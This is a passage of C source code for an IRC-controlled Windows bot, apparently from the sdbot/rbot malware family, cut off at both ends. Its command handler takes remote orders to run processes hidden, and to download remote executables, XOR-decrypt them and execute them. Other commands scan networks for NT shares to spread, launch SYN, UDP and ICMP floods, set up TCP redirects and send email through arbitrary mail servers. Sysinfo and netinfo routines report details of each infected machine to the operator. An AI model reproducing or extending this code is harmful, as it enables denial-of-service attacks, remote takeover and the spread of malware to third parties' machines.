			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				int n,j;
				n=(sizeof(a)/4);
				for (i=s;i<n;i++) {
					if (a[i]==NULL) break;
					j=atoi(a[i]);
					if ((j>0) && (j<64)) {
						TerminateThread(threads[j], 0);
						if (threads[j] != 0) threadkilled = TRUE;
						threads[j] = 0;
						threadd[j][0] = '\0';
						cnick[j][0] = '\0';
						closesocket(csock[j]);
					}
				}
				if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "xThread(s) killed.", notice);
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :Client exiting");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "File opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "Couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "Couldn't resolve host.", notice);
	
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("ntscan",a[s])==0) {
			//if (ntscan==TRUE) {
				if (scanning==TRUE) {                                 //If scanning equals true then halt
					if (!silent)  {
						sprintf(pm ,"(xTScan): Already scanning bitches | Stable Ver.]");
						irc_privmsg(sock,a[2],pm,notice);
					}
				}
	
	
				else {                                                //Else carry on
					scanning=TRUE;                                   //Set scanning to true therefore cant rescan
					/////////////////////////////////////////////////
					nt_msg->notice=notice;
					nt_msg->sock=sock;
					strncpy(nt_msg->chan,  a[2], sizeof(nt_msg->chan)-1);
					/////////////////////////////////////////////////

					DWORD pthreads,minutes;
					pthreads=strtoul(a[s+1],0,10);
					minutes=strtoul(a[s+2],0,10);
					if (pthreads>200) pthreads=200;
					if (pthreads<=0) pthreads=1;
					if (minutes>500) minutes=500;
					if (minutes<=0) minutes=1;

					if (!silent) irc_privmsg(sock,a[2],"[xT]Scan]: Scanning NT-shares..",notice);
					NTSCAN *ns;
					ns=(NTSCAN *)malloc(sizeof(NTSCAN));
					ns->minutes=minutes;
					ns->threads=pthreads;
					i=addthread("NTScan");
					ns->threadid=i;
					if (a[s+3]) {
						strcpy(ns->ipmask,a[s+3]);
					}
					if (parmenters['a']) {
						//We need to take *SELF* ip and scan near this :P..
						int sin_size;
						SOCKADDR_IN sin;
						char *c;
						sin_size=sizeof(SOCKADDR_IN);
						getsockname(sock,(SOCKADDR*)&sin,&sin_size);
						sin.sin_addr.S_un.S_addr&=(parmenters['b']==0) ? 0xFFFFFF : 0xFFFF;
						strcpy(ns->ipmask,inet_ntoa(sin.sin_addr));
						if (parmenters['b']==0) {
							// remove only last dot
							c=strrchr(ns->ipmask,'.');
							if (c) c[0]=0;
						} else {
							c=strchr(ns->ipmask,'.');
							if (c) {
								c=strchr(c+1,'.');
								if (c) {
									c[0]=0;
								}
							}
						}
					}
					threads[i]=CreateThread(0,0,&ntpass_main,ns,0,0);
				}
			}

			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				if (a[s+3]) ds.expectedcrc=strtoul(a[s+3],0,16);
				if (a[s+4]) ds.filelen=atoi(a[s+4]);
				ds.encrypted=(parmenters['e']);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "Downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "Couldn't execute file.", notice);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "Clone(s) created on %s:%d, in channel %s\r\n", irc.host, irc.port, irc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
				while(1) {
					if (irc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#ifndef NO_SYN
else if (strcmp("syn", a[s]) == 0) {
synt sin;
strncpy(sin.ip, a[s+1], sizeof(sin.ip)-1);
strncpy(sin.port, a[s+2], sizeof(sin.port)-1);
strncpy(sin.length, a[s+3], sizeof(sin.length)-1);
strncpy(sin.chan, a[2], sizeof(sin.chan)-1);
sin.notice = notice;
sin.socket = sock;
sprintf(sendbuf, "SYN flooding [%s:%s] for %s second(s)\r\n", a[s+1], a[s+2], a[s+3]);
irc_privmsg(sock, a[2], sendbuf, notice);
sin.threadnumber = addthread(sendbuf);
threads[sin.threadnumber] = CreateThread(NULL, 0, &synthread, (void *)&sin, 0, &id);
//sprintf(sendbuf, "Done with SYN Attack [%iKB/s]\r\n", SYNFlood(a[s+1], a[s+2], a[s+3]));
//irc_privmsg(sock, a[2], sendbuf, notice);

}
			#endif
			#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				ds.notice=notice;
				ds.expectedcrc=0;
				ds.filelen=0;
				ds.encrypted=(parmenters['e']);
				if (a[s+4]) ds.expectedcrc=strtoul(a[s+4],0,16);		//CRC check..
				if (a[s+5]) ds.filelen=atoi(a[s+5]);
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) {
					sprintf(sendbuf, "Downloading %s..\r\n", a[s+1]);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "Redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				if (!silent) sprintf(sendbuf, "TCP redirect created on port %d to %s:%d\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_SCAN
			else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
				scans sscan;
				sscan.addy.S_un.S_addr = inet_addr(a[s+1]);
				sscan.port = atoi(a[s+2]);
				sscan.delay = atoi(a[s+3]);
				sscan.sock = sock;
				sscan.notice = notice;
				strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);
				sprintf(sendbuf, "scan (%s:%d)", inet_ntoa(sscan.addy), sscan.port);
				sscan.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "Port scan started %s:%d (Delay): %dms\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
				while(1) {
					if (sscan.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				ps udps;
				udps.silent = silent;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;
				sprintf(sendbuf, "UDP (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "Sending %d UDP packets to %s (Packet size): %d (Delay): %d[ms]\r\n", udps.num, udps.host, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(1) {
					if (udps.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;
					sprintf(sendbuf, "Ping (%s)", pings.host);
					pings.threadnum = addthread(sendbuf);
					sprintf(sendbuf, "Sending %d pings to %s (Packet size): %d (Timeout): %d[ms]\r\n", pings.num, pings.host, pings.size, pings.delay);
					threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(1) {
						if (pings.gotinfo == TRUE) break;
						Sleep(50);
					}
				} else strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
		    else if (strcmp("email", a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256];
				int port;
				char sender_email[256];
				char recp_email[256];
				char subject[256];
				char BigBuf[1024];
				char myBuf[256];
				int nRet;
				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				WSAStartup(version, &wsaData);
				LPHOSTENT lpHostEntry;
				lpHostEntry = gethostbyname(server);
				SOCKET MailSocket;
				MailSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = htons(port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = connect(MailSocket, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = send(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = recv(MailSocket, myBuf, sizeof(myBuf), 0);
				closesocket(MailSocket);
				WSACleanup();
				sprintf(sendbuf, "email sent to %s",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}

		}
	}
	return repeat;
 }




// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[512];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[512];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[512];
	char str3[512];
	char str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 


 #ifndef NO_DOWNLOAD
// function for downloading files/updating
 DWORD WINAPI webdownload(LPVOID param)
 {
	char fbuff[512];
	char tstr[256];
	HANDLE fh, f;
	DWORD r, d, start, total, speed;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	ds dl;
	dl = *((ds *)param);
	ds *dsp = (ds *)param;
	dsp ->gotinfo = TRUE;
	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			if (!dl.silent) {
				sprintf(fbuff,"Couldn't open %s.",dl.dest);
				irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
			}
			threads[dl.threadnum] = 0;
			threadd[dl.threadnum][0] = '\0';
			return 0;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIXME: Only checks first 500 kb
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			if (dl.encrypted==TRUE) {
				Xorbuff(fbuff,r);
			}
			WriteFile(f, fbuff, r, &d, NULL);
			
			if ((total) < 512000)
			{
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) bytestocopy=r;
				memcpy(&fileTotBuff[total],fbuff,bytestocopy);
			}
			total+=r;
			if (dl.filelen) if (total>dl.filelen) break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) sprintf(threadd[dl.threadnum], "File download (%s - %dkb transferred)", dl.url, total / 1024);
			 else sprintf(threadd[dl.threadnum], "update (%s - %dkb transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(tstr,"Filesize is INCORRECT!!");
				irc_privmsg(dl.sock,dl.chan,tstr,dl.notice);
			}
		}

		speed = total / (((GetTickCount() - start) / 1000) + 1);

		CloseHandle(f);

		if (dl.expectedcrc) {
			unsigned long crc,crclength;
			sprintf(fbuff,"crc32([%lu], [%d])\n",fileTotBuff,total);
			crclength=total;
			if (crclength>512000) crclength=512000;
			crc=crc32(fileTotBuff,crclength);
			if (crc!=dl.expectedcrc) {
				goodfile=FALSE;
				irc_privmsg(dl.sock,dl.chan,"CRC failed!",dl.notice);
			}
			
		}
		free(fileTotBuff);



		if (goodfile==FALSE) goto badfile;

		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(tstr, "Downloaded %.1f kb to %s @ %.1f kb/sec.", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			if (dl.run == 1) {
				ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(fbuff,"opened %s.",dl.dest);
					irc_privmsg(dl.sock,dl.chan,fbuff,dl.notice);
				}
			}

		// download is an update
		} else {
			sprintf(tstr, "Downloaded %.1f kb to %s @ %.1f kb/s. Updating...", total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, dl.notice);

			memset(&sinfo, 0, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				uninstall();
				WSACleanup();
				exit(0);
			} else {
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "Update failed: Error executing file.", dl.notice);
			}
		}
	} else if (!dl.silent) irc_privmsg(dl.sock, dl.chan, "Bad URL, or DNS Error.", dl.notice);
badfile:
	InternetCloseHandle(fh);

	threads[dl.threadnum] = 0;
	threadd[dl.threadnum][0] = '\0';
	return 0;
 }
 #endif
 
 #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "Dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "(Connection type): %s [%s] (Local IP address): %d.%d.%d.%d (Connected from): %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "??";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	sprintf(sinfo, "(CPU): %I64uMHz (RAM): %dKB total, %dKB free (OS): Windows %s [%d.%d, build %d] (Uptime): %dd %dh %dm",
		cpuspeed(), memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
	return sinfo; // return the sysinfo string
 }


// cpu speed function
 unsigned __int64 cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 #pragma warning( disable : 4035 )
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

